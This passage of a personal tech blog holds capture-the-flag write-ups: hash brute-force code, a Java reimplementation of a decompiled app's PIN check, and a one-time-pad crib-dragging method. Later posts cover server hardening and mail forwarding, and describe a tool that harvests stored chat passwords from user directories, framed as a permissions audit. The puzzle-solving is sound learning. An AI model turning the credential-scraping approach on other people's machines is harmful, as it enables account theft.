            <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&#39;[*] Third part is:&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">word</span>
            <span style="color: #66d9ef">return</span>

<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">part_4</span><span style="color: #f8f8f2">():</span>
    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">p</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">gen:</span>
        <span style="color: #f8f8f2">word</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;&#39;</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">join(p)</span>
        <span style="color: #f8f8f2">h</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">SHA256</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">new()</span>
        <span style="color: #f8f8f2">h</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">update(word)</span>
        <span style="color: #f8f8f2">hashed</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">h</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">hexdigest()</span>

        <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">hashed[</span><span style="color: #ae81ff">18</span><span style="color: #f8f8f2">:</span><span style="color: #ae81ff">24</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">target[</span><span style="color: #ae81ff">3</span><span style="color: #f8f8f2">]:</span>
            <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&#39;[*] Fourth part is:&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">word</span>
            <span style="color: #66d9ef">return</span>

<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">part_5</span><span style="color: #f8f8f2">():</span>
    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">p</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">gen:</span>
        <span style="color: #f8f8f2">word</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;&#39;</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">join(p)</span>
        <span style="color: #f8f8f2">h</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">SHA512</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">new()</span>
        <span style="color: #f8f8f2">h</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">update(word)</span>
        <span style="color: #f8f8f2">hashed</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">h</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">hexdigest()</span>

        <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">hashed[</span><span style="color: #ae81ff">24</span><span style="color: #f8f8f2">:</span><span style="color: #ae81ff">30</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">target[</span><span style="color: #ae81ff">4</span><span style="color: #f8f8f2">]:</span>
            <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&#39;[*] Fifth part is:&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">word</span>
            <span style="color: #66d9ef">return</span>


<span style="color: #f8f8f2">my_chars</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">string</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">printable</span>

<span style="color: #f8f8f2">target</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">[</span><span style="color: #e6db74">&#39;757c47&#39;</span><span style="color: #f8f8f2">,</span><span style="color: #e6db74">&#39;9895d6&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;845b2b&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;0530cd&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;9a2b11&#39;</span><span style="color: #f8f8f2">]</span>

<span style="color: #f8f8f2">which_part</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]</span>

<span style="color: #f8f8f2">gen</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">itertools</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">combinations_with_replacement(my_chars,</span> <span style="color: #ae81ff">6</span><span style="color: #f8f8f2">)</span>
<span style="color: #f8f8f2">i</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span>
<span style="color: #66d9ef">print</span> <span style="color: #e6db74">&#39;[+] Here we go....&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">which_part</span>

<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">which_part</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&#39;1&#39;</span><span style="color: #f8f8f2">:</span>
    <span style="color: #f8f8f2">part_1()</span>

<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">which_part</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&#39;2&#39;</span><span style="color: #f8f8f2">:</span>
    <span style="color: #f8f8f2">part_2()</span>

<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">which_part</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&#39;3&#39;</span><span style="color: #f8f8f2">:</span>
    <span style="color: #f8f8f2">part_3()</span>

<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">which_part</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&#39;4&#39;</span><span style="color: #f8f8f2">:</span>
    <span style="color: #f8f8f2">part_4()</span>

<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">which_part</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&#39;5&#39;</span><span style="color: #f8f8f2">:</span>
    <span style="color: #f8f8f2">part_5()</span>

<span style="color: #66d9ef">print</span> <span style="color: #e6db74">&#39;[+] Finished&#39;</span>
</pre></div>
</p>

<h1 id="challenge-25:00aa8d5840836b6803fb0a2203b66750">Challenge 25</h1>

<p>Not solved.</p>

<h1 id="challenge-26:00aa8d5840836b6803fb0a2203b66750">Challenge 26</h1>

<p>I saw no really easy way to do this other than taking apart the apk and
using <code>dex2jar</code> on the main java file. In this file I found the code
that makes use of the PIN and reversed engineered the code. There&rsquo;s
some hashing and ultimately the app will download the egg.</p>

<p>So I reimplemented the Java code and bruteforced it. A few numbers matched,
so I just entered them until I got a valid download:
(disclaimer: I am not very good at Java at all)</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">import</span> <span style="color: #f8f8f2">java.io.File</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">java.io.FileOutputStream</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">java.security.MessageDigest</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">java.security.SecureRandom</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">java.util.regex.Matcher</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">java.util.regex.Pattern</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">java.security.*</span><span style="color: #f92672">;</span> <span style="color: #75715e">//MessageDigest;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">javax.crypto.*</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">javax.crypto.spec.*</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">javax.crypto.spec.SecretKeySpec</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">java.awt.Graphics</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">java.util.Arrays</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">java.awt.image.BufferedImage</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">java.nio.file.Files</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">java.nio.file.Paths</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">java.io.ByteArrayInputStream</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">java.security.*</span><span style="color: #f92672">;</span> <span style="color: #75715e">//MessageDigest;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">javax.crypto.*</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">javax.crypto.spec.*</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">javax.imageio.ImageIO</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">javax.swing.JFrame</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">javax.swing.JPanel</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">java.io.File</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">sun.misc.BASE64Decoder</span><span style="color: #f92672">;</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">sun.misc.BASE64Encoder</span><span style="color: #f92672">;</span>

<span style="color: #66d9ef">public</span> <span style="color: #66d9ef">class</span> <span style="color: #a6e22e">HelloWorld</span>
<span style="color: #f92672">{</span>
    <span style="color: #66d9ef">public</span> <span style="color: #66d9ef">static</span> <span style="color: #66d9ef">byte</span><span style="color: #f92672">[]</span> <span style="color: #a6e22e">do_sha</span><span style="color: #f92672">(</span><span style="color: #f8f8f2">String</span> <span style="color: #f8f8f2">s</span><span style="color: #f92672">,</span> <span style="color: #f8f8f2">String</span> <span style="color: #f8f8f2">s1</span><span style="color: #f92672">,</span> <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">i1</span><span style="color: #f92672">)</span> <span style="color: #66d9ef">throws</span> <span style="color: #f8f8f2">NoSuchAlgorithmException</span>
    <span style="color: #f92672">{</span>
        <span style="color: #f8f8f2">MessageDigest</span> <span style="color: #f8f8f2">messagedigest</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">MessageDigest</span><span style="color: #f92672">.</span><span style="color: #a6e22e">getInstance</span><span style="color: #f92672">(</span><span style="color: #e6db74">&quot;SHA1&quot;</span><span style="color: #f92672">);</span>
        <span style="color: #66d9ef">byte</span> <span style="color: #f8f8f2">abyte0</span><span style="color: #f92672">[]</span> <span style="color: #f92672">=</span> <span style="color: #f92672">(</span><span style="color: #66d9ef">new</span> <span style="color: #f8f8f2">StringBuilder</span><span style="color: #f92672">(</span><span style="color: #f8f8f2">String</span><span style="color: #f92672">.</span><span style="color: #a6e22e">valueOf</span><span style="color: #f92672">(</span><span style="color: #f8f8f2">s1</span><span style="color: #f92672">))).</span><span style="color: #a6e22e">append</span><span style="color: #f92672">(</span><span style="color: #f8f8f2">s</span><span style="color: #f92672">).</span><span style="color: #a6e22e">toString</span><span style="color: #f92672">().</span><span style="color: #a6e22e">getBytes</span><span style="color: #f92672">();</span>
        <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">j1</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span><span style="color: #f92672">;</span>
        <span style="color: #66d9ef">do</span>
        <span style="color: #f92672">{</span>
            <span style="color: #66d9ef">if</span><span style="color: #f92672">(</span><span style="color: #f8f8f2">j1</span> <span style="color: #f92672">&gt;=</span> <span style="color: #f8f8f2">i1</span><span style="color: #f92672">)</span>
            <span style="color: #f92672">{</span>
                <span style="color: #66d9ef">byte</span> <span style="color: #f8f8f2">abyte1</span><span style="color: #f92672">[]</span> <span style="color: #f92672">=</span> <span style="color: #66d9ef">new</span> <span style="color: #66d9ef">byte</span><span style="color: #f92672">[</span><span style="color: #ae81ff">16</span><span style="color: #f92672">];</span>
                <span style="color: #f8f8f2">System</span><span style="color: #f92672">.</span><span style="color: #a6e22e">arraycopy</span><span style="color: #f92672">(</span><span style="color: #f8f8f2">abyte0</span><span style="color: #f92672">,</span> <span style="color: #ae81ff">0</span><span style="color: #f92672">,</span> <span style="color: #f8f8f2">abyte1</span><span style="color: #f92672">,</span> <span style="color: #ae81ff">0</span><span style="color: #f92672">,</span> <span style="color: #ae81ff">15</span><span style="color: #f92672">);</span>
                <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">abyte1</span><span style="color: #f92672">;</span>
            <span style="color: #f92672">}</span>
            <span style="color: #f8f8f2">abyte0</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">messagedigest</span><span style="color: #f92672">.</span><span style="color: #a6e22e">digest</span><span style="color: #f92672">(</span><span style="color: #f8f8f2">abyte0</span><span style="color: #f92672">);</span>
            <span style="color: #f8f8f2">j1</span><span style="color: #f92672">++;</span>
        <span style="color: #f92672">}</span> <span style="color: #66d9ef">while</span><span style="color: #f92672">(</span><span style="color: #66d9ef">true</span><span style="color: #f92672">);</span>
    <span style="color: #f92672">}</span>

    <span style="color: #66d9ef">public</span> <span style="color: #66d9ef">static</span> <span style="color: #f8f8f2">String</span> <span style="color: #a6e22e">hardwork</span><span style="color: #f92672">(</span><span style="color: #f8f8f2">String</span> <span style="color: #f8f8f2">s</span><span style="color: #f92672">)</span>
    <span style="color: #f92672">{</span>
        <span style="color: #f8f8f2">String</span> <span style="color: #f8f8f2">s1</span> <span style="color: #f92672">=</span> <span style="color: #66d9ef">new</span> <span style="color: #f8f8f2">String</span><span style="color: #f92672">();</span>
        <span style="color: #66d9ef">try</span>
        <span style="color: #f92672">{</span>
            <span style="color: #f8f8f2">Cipher</span> <span style="color: #f8f8f2">cipher</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">Cipher</span><span style="color: #f92672">.</span><span style="color: #a6e22e">getInstance</span><span style="color: #f92672">(</span><span style="color: #e6db74">&quot;AES&quot;</span><span style="color: #f92672">);</span>
            <span style="color: #f8f8f2">SecretKeySpec</span> <span style="color: #f8f8f2">secretkeyspec</span> <span style="color: #f92672">=</span> <span style="color: #66d9ef">new</span> <span style="color: #f8f8f2">SecretKeySpec</span><span style="color: #f92672">(</span><span style="color: #f8f8f2">do_sha</span><span style="color: #f92672">(</span><span style="color: #f8f8f2">s</span><span style="color: #f92672">,</span> <span style="color: #e6db74">&quot;ovaederecumsale&quot;</span><span style="color: #f92672">,</span> <span style="color: #ae81ff">10000</span><span style="color: #f92672">),</span> <span style="color: #e6db74">&quot;AES&quot;</span><span style="color: #f92672">);</span>
            <span style="color: #f8f8f2">cipher</span><span style="color: #f92672">.</span><span style="color: #a6e22e">init</span><span style="color: #f92672">(</span><span style="color: #ae81ff">2</span><span style="color: #f92672">,</span> <span style="color: #f8f8f2">secretkeyspec</span><span style="color: #f92672">);</span>
            <span style="color: #f8f8f2">BASE64Decoder</span> <span style="color: #f8f8f2">decoder</span> <span style="color: #f92672">=</span> <span style="color: #66d9ef">new</span> <span style="color: #f8f8f2">BASE64Decoder</span><span style="color: #f92672">();</span>
            <span style="color: #66d9ef">byte</span><span style="color: #f92672">[]</span> <span style="color: #f8f8f2">decodedBytes</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">decoder</span><span style="color: #f92672">.</span><span style="color: #a6e22e">decodeBuffer</span><span style="color: #f92672">(</span><span style="color: #e6db74">&quot;8QeNdEdkspV6+1I77SEEEF4aWs5dl/auahJ46MMufkg=&quot;</span><span style="color: #f92672">);</span>
            <span style="color: #66d9ef">byte</span><span style="color: #f92672">[]</span> <span style="color: #f8f8f2">plaintxt</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">cipher</span><span style="color: #f92672">.</span><span style="color: #a6e22e">doFinal</span><span style="color: #f92672">(</span><span style="color: #f8f8f2">decodedBytes</span><span style="color: #f92672">);</span>
            <span style="color: #f8f8f2">BASE64Encoder</span> <span style="color: #f8f8f2">encoder</span> <span style="color: #f92672">=</span> <span style="color: #66d9ef">new</span> <span style="color: #f8f8f2">BASE64Encoder</span><span style="color: #f92672">();</span>
            <span style="color: #f8f8f2">s1</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">encoder</span><span style="color: #f92672">.</span><span style="color: #a6e22e">encodeBuffer</span><span style="color: #f92672">(</span><span style="color: #f8f8f2">plaintxt</span><span style="color: #f92672">);</span>
        <span style="color: #f92672">}</span>
        <span style="color: #66d9ef">catch</span><span style="color: #f92672">(</span><span style="color: #f8f8f2">Exception</span> <span style="color: #f8f8f2">exception</span><span style="color: #f92672">)</span>
        <span style="color: #f92672">{</span>
            <span style="color: #66d9ef">return</span> <span style="color: #e6db74">&quot;&quot;</span><span style="color: #f92672">;</span>
        <span style="color: #f92672">}</span>

        <span style="color: #f8f8f2">System</span><span style="color: #f92672">.</span><span style="color: #a6e22e">out</span><span style="color: #f92672">.</span><span style="color: #a6e22e">println</span><span style="color: #f92672">(</span><span style="color: #f8f8f2">s</span><span style="color: #f92672">);</span>
        <span style="color: #f8f8f2">System</span><span style="color: #f92672">.</span><span style="color: #a6e22e">out</span><span style="color: #f92672">.</span><span style="color: #a6e22e">println</span><span style="color: #f92672">(</span><span style="color: #f8f8f2">s1</span><span style="color: #f92672">);</span>
        <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">s1</span><span style="color: #f92672">;</span>
    <span style="color: #f92672">}</span>

    <span style="color: #66d9ef">public</span> <span style="color: #66d9ef">static</span> <span style="color: #66d9ef">void</span> <span style="color: #a6e22e">main</span><span style="color: #f92672">(</span><span style="color: #f8f8f2">String</span><span style="color: #f92672">[]</span> <span style="color: #f8f8f2">args</span><span style="color: #f92672">)</span>  <span style="color: #66d9ef">throws</span> <span style="color: #f8f8f2">Exception</span>
    <span style="color: #f92672">{</span>
        <span style="color: #f8f8f2">hardwork</span><span style="color: #f92672">(</span><span style="color: #f8f8f2">args</span><span style="color: #f92672">[</span><span style="color: #ae81ff">0</span><span style="color: #f92672">]);</span>
    <span style="color: #f92672">}</span>
<span style="color: #f92672">}</span>
</pre></div>
</p>

<h1 id="challenge-27:00aa8d5840836b6803fb0a2203b66750">Challenge 27</h1>

<p>One time pad with a reused pad. Another challenge that taught me a lot, specifically
cribdragging. Having found <a href="https://github.com/SpiderLabs/cribdrag">this tool</a> I started
to figure out how to use this.</p>

<p>Basically you need to take two of the encrypted texts, use the <code>xorstrings</code> to
xor them together and then pass that to the <code>cribdrag</code> tool. Then you need to start
entering words that might be in the text. If a word like <code>the</code>, or <code>and</code>, are in the
text, you should see some plaintext appear in the output. Then perhaps pad the word
with spaces either side. Once you have more of the plaintext, you can use that to
expand the strings in either text.</p>

<p>Eventually you will get the plain text for either string. Using that you can then
decipher the other texts.</p>

<p>The strings increase in length, so combine them all until you have the final
sentence.</p>

<p>Here&rsquo;s a quick example for a couple of the lines:</p>

<p><a href="https://asciinema.org/a/65rhh2rqofe51f0yst1nktmbu"><img src="https://asciinema.org/a/65rhh2rqofe51f0yst1nktmbu.png" alt="asciicast" /></a></p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/05/29/burnmail-temporary-mail-forwarding/">
        Burnmail: temporary mail forwarding
      </a>
    </h1>

    <span class="post-date">Fri, May 29, 2015</span>

    

<p>A while back I got curious about how easy it would be to setup a temporary
email forwarding service, akin to <a href="https://meltmail.com/">Meltmail</a>. So I got
to it and made it.</p>

<p>In essence you will create a temporary email address that will forward all
mail it receives to your inbox. Once it expires, it drops all incoming mail.</p>

<p>It&rsquo;s pretty much ready now, hence why I am posting about it.</p>

<p>The differences between Burnmail (yeah, best I could do for now) and other
services is:</p>

<ul>
<li>forwarding can be expired by time or by number of received mails</li>
<li>all tasks are accomplished through email. There&rsquo;s no web interface</li>
<li>forwarding address is based on your original address with a short, random
string appended, to make it easy to remember.</li>
<li>addreses are also easy to type on a mobile device,
as the extra string consists of digits and lowercase chars only.</li>
<li>commands are forgiving and short</li>
</ul>

<p>The plan is to clean up the code and then release that on Github, but in the
meantime feel free to make use of it.</p>

<p>Here&rsquo;s how to use it:</p>

<h2 id="creating-a-new-burnmail-address:e52eba2da256b91bcb5838bbad42c991">Creating a new Burnmail address</h2>

<p>To create a new Burnmail address, send an email to <a href="mailto:burn@kthnxbai.co.uk">burn@kthnxbai.co.uk</a>,
from the address that you want your Burnmail forwarded to. In the subject
you need to specify the expiration term. The following commands are valid:</p>

<pre><code>* time [n] - n is 3, 6, 12, 24, or 48 hours. It will automatically
  select the closest value to the one you specify.
* uses [n] - n is between 1 and 30. It will be automatically capped to 30.
</code></pre>

<p>By using the <code>time</code> command you will create an address that expires after <code>n</code>
hours. The <code>uses</code> command creates an address that expires after <code>n</code> emails have
been received through that address.</p>

<p>Once your forwarder has been set up, you will receive a confirmation email with
your Burnmaill address. Check your spam folder just in case.</p>

<h2 id="getting-a-list-of-emails:e52eba2da256b91bcb5838bbad42c991">Getting a list of emails</h2>

<p>To get a list of your current Burnmail addresses for an email address,
send an email to <a href="mailto:burn@kthnxbai.co.uk">burn@kthnxbai.co.uk</a> with the subject <code>stat</code>.
An email listing all your current forwarders for that address and their
expiration terms will be sent to you.</p>

<h2 id="deleting-burnmail:e52eba2da256b91bcb5838bbad42c991">Deleting Burnmail</h2>

<p>To delete a Burnmail send an email to <a href="mailto:burn@kthnxbai.co.uk">burn@kthnxbai.co.uk</a> with the subject
<code>kill address</code>, where <code>address</code> is the burnmail address to kill.</p>

<h2 id="thoughts:e52eba2da256b91bcb5838bbad42c991">Thoughts?</h2>

<p>That&rsquo;s it for now. Make sure to check your spam folder if you aren&rsquo;t
receiving any mail.</p>

<p>If you have any suggestions for features, or notice something broken,
please let me know.</p>

<p>Also bear in mind that it&rsquo;s early days so there might be bugs.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/05/14/i-made-this-purplescraper/">
        I made this: Purplescraper
      </a>
    </h1>

    <span class="post-date">Thu, May 14, 2015</span>

    <p>Had this script sitting around for a while and I figured I would clean it up
a bit and share it.</p>

<p>Get <a href="https://github.com/Svenito/purplescraper">Purplescraper from my Github</a></p>

<p>In short: you give it a starting directory, which will usually be where all the user
directories are, and it will go get all <code>.purple/accounts.xml</code> files and extract
any usernames and passwords it finds into a new file.</p>

<p>Useful to make sure none of your sensitive data is available to other, non
authorised users via slack file permissions.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/05/08/the-joys-of-server-ownership/">
        The joys of server ownership
      </a>
    </h1>

    <span class="post-date">Fri, May 8, 2015</span>

    

<p>This post serves mostly as a &ldquo;note to self&rdquo;.</p>

<p>I just ordered myself a super cheap VPS from <a href="http://ramnode.com">Ramnode</a> as I have
a little project I would like to setup and see if I can make it work.</p>

<p>But first I had to setup the server (Debian 7.0) and it&rsquo;s been a while since I&rsquo;ve done that, so
some reading was in order to remind myself of all the joys. Thus I decided to note this
down for myself and anyone else who&rsquo;s interested. So it&rsquo;s not an in depth explanation
by any means.</p>

<h2 id="securing:5917a0b95cbd7d2b1be5f00f2236d291">Securing</h2>

<p>I&rsquo;m not looking for bullet proof as this won&rsquo;t be a production server and won&rsquo;t
hold any sensitive info, but I&rsquo;d like to know that it&rsquo;s at least somewhat locked
down.</p>

<p>So first off install <a href="http://www.fail2ban.org/wiki/index.php/Main_Page">Fail2ban</a>. This
will lock out users who fail to authenticate too often. Ramnode actually have a
<a href="https://www.youtube.com/watch?v=GmVoqFv_lGU">good video on this</a>. As we&rsquo;ll
only allow key based authentication it&rsquo;s a bit redundant, but if you want to
go that way, there&rsquo;s the info.</p>

<p>Then turn off password authentication for SSH as I&rsquo;ll be using only keys to
authenticate. Edit <code>/etc/ssh/sshd_conf</code> and change the following lines to read:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">ChallengeResponseAuthentication no
PasswordAuthentication no
UsePAM no
</pre></div>


<p>Make sure you have uploaded your <a href="https://help.ubuntu.com/community/SSH/OpenSSH/Keys">public key</a> to
<code>~/.ssh/authorized_keys</code> and set the permissions on <code>.ssh</code> and <code>authorized_keys</code> on the
server to <code>700</code> and <code>600</code> respectively.</p>

<p>I also changed the default SSH port to something else, as that already keeps the number of automated
bruteforcers down. Do this by changing the following line in <code>/etc/ssh/sshd_config</code></p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">Port 22
</pre></div>


<p>Set it to anything that doesn&rsquo;t clash with other services. i.e. not 25 or 80 for example.</p>

<p>Once configured <code>sudo service sshd reload</code> to pick up the changes.</p>

<p>So next up <code>iptables</code>. I followed <a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-a-firewall-using-ip-tables-on-ubuntu-12-04">this guide</a>
which gives you a good start. Be sure to run <code>sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT</code> first.
Otherwise you&rsquo;ll end up blocking your current connection and&hellip; yeah, ok, I made that mistake.</p>

<p>Then allow what you need and default to dropping the rest. It&rsquo;s all in the URL above, but to re-iterate:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"># Accept connections on port 22
iptables -A INPUT -p tcp --syn --destination-port 22 -j ACCEPT

# Deny all other input
iptables -A INPUT -p tcp -syn -j DROP
</pre></div>


<p>You will need to run the first line for each port that needs to be able to accept
incoming connections.</p>

<p>I additionally set up <a href="http://www.zeroflux.org/projects/knock">knockd</a> just to play around with it.</p>

<p>To do this edit <code>/etc/knockd.conf</code> and set the port sequences. It should have a default
set for enabling and disabling the ssh port. Edit this to reflect any port changes. If you want to run miltiple commands
for a knock, simply concatenate the command with <code>&amp;&amp;</code>. You can even make one command open
a port for a given time. As we have our *keep established connections&rdquo; rule in <code>iptables</code> we
can do</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">[opencloseSSH]
        sequence      = 2222:udp,3333:tcp,4444:udp
        seq_timeout   = 15
        tcpflags      = syn,ack
        start_command = /usr/sbin/iptables -A INPUT -s %IP% -p tcp --syn --dport 22 -j ACCEPT
        cmd_timeout   = 10
        stop_command  = /usr/sbin/iptables -D INPUT -s %IP% -p tcp --syn --dport 22 -j ACCEPT
</pre></div>
</p>

<p>Lifted from the docs. This will allow and block only the IP from where the knock originated.</p>

<p>That&rsquo;s all for now. Postfix next time&hellip;.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/04/15/hows-that-pizza-coming-along/">
        How&#39;s that Pizza coming along?
      </a>
    </h1>

    <span class="post-date">Wed, Apr 15, 2015</span>

    

<p><strong>UPDATE</strong>: Published what I have done so far <a href="https://github.com/Svenito/dominos">on my Github</a></p>

<p>Having been a bit busy with other things recently, I&rsquo;ve not mentioned the Domino&rsquo;s
thing for a while. So in case anyone is wondering where I am with this:</p>

<script type="text/javascript" src="https://asciinema.org/a/17706.js" id="asciicast-17706" async></script>

<p>Basically I&rsquo;ve reworked how the store finder works. I&rsquo;ve collapsed the whole store finding and
delivery postcode stuff into one <code>locate_store</code> call.
Enter your postcode and it&rsquo;ll get the nearest delivery capable store and select it.
Much simpler, as you can see.</p>

<p>Now you also specify your name, phone number, and email when you select the
delivery address. The payment side of things is coming along, but is only in debug
at the moment.</p>

<h3 id="what-s-planned:5a759afdcb888fa1ea8f501772dd420a">What&rsquo;s planned</h3>

<p>I want to actually place a <em>cash on delivery</em> order and eat a CLI pizza. Once that&rsquo;s finished,
I will clean up the project, put it on Github, and package it for <em>pip</em>.</p>

<p>Then I&rsquo;ll get to work on investigating if I can handle card payments via this tool too. Certainly
there seems to be some relevant info available. With some luck this will work on some sort of
URL callback, but I&rsquo;ll find out eventually.</p>

<p>Then it&rsquo;s really about hoping that enough people like it, and want to help
by adding support for ordering in their own country.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/04/14/revisiting-strong-passwords/">
        Revisiting strong passwords
      </a>
    </h1>

    <span class="post-date">Tue, Apr 14, 2015</span>

    

<p>Some time ago I wrote a post about <a href="http://unlogic.co.uk/2012/06/06/strong-passwords/">strong passwords</a>.
That was three years ago and I figured I might as well revist what I wrote back then.</p>

<p>Since then technology has moved on a lot, and the number of password breaches has increased,
aswell as the number of reports mocking our poorly chosen passwords.</p>

<p>As far as I am concerned, I am still using 15-18 random character passwords. I&rsquo;m no longer
lowercase only, but a mixture of upper, lower, digit, and punctuation. The length depends
on how long I am allowed to make my passwords. Believe it or not, some sites limit you to
a maximum length of 12, possibly less on some sites. Silly huh? Not only that, but still they
tell me my 18 character password without punctuation or digits is less secure than a
4 character mixed character password. Hmph.</p>

<p>But what is cropping up more and more, and what I wanted to write about, is the password
rules on signup pages. For example &ldquo;Your password must be at least 8
characters long, contain one upper case letter, and a number.&rdquo; Sometimes a <em>special
character</em> is thrown into the mix too. The issue here is, that although your final
password is more secure (in theory), the search space for a valid password is reduced.
With some attackers being able to generate 1 trillion guesses per second, keeping the
size of the search space large will help.</p>

<p>By how much difference does it make? Well that&rsquo;s what I want to figure out.</p>

<p>So using the commonly used english alphabet with digits and
special characters we have the following available</p>

<table>
<thead>
<tr>
<th>Name</th>
<th>Content</th>
<th>Character Count</th>
</tr>
</thead>

<tbody>
<tr>
<td>lower</td>
<td>abcdefghijklmnopqrstuvwxyz</td>
<td>26</td>
</tr>

<tr>
<td>upper</td>
<td>ABCDEFGHIJKLMNOPQRSTUVWXYZ</td>
<td>26</td>
</tr>

<tr>
<td>digits</td>
<td>0123456789</td>
<td>10</td>
</tr>

<tr>
<td>special</td>
<td>!&ldquo;#$%&amp;&lsquo;()*+,-./:;&lt;=&gt;?@[]^_{|}~`</td>
<td>32</td>
</tr>
</tbody>
</table>

